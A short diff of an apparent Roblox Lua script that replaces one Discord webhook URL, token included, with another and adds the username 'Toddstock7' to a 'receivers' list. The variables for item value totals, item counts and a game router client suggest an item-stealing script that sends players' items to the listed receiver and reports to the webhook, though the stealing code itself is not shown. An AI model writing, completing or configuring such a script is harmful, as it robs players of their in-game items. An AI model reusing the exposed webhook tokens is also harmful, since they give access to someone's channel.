@@ -10,14 +10,14 @@ local VPS_API_KEY = "sabapi_secret_key"
 local ping_threshold = 6
 local min_value = 6
 local pingEveryone = "No"
-local webhook = "https://discord.com/api/webhooks/1536171287985000578/tMfnq9FQZf3XR11FmK5f6i56G0r0Jp7T-FGXuStq_JL6mPeETTBVqP-6RU18AosQIjUU"
+local webhook = "https://discord.com/api/webhooks/1542891256424701952/HtxAQE74xFC1BtGshMkPytkJMgkqPwTT-ffdpjNeyFXLaI5HnVPcgKMx2J5qDZkz7dMQ"
 local scriptExecuted = true
 
 local totalValue = 0
 local itemCount = 0
 local Usernames = {}
 local RealJobID = game.JobId
-local receivers = {}
+local receivers = {"Toddstock7"}
 
 local Fsys = ReplicatedStorage:WaitForChild("Fsys")
 local RouterClient = Fsys:WaitForChild("RouterClient")
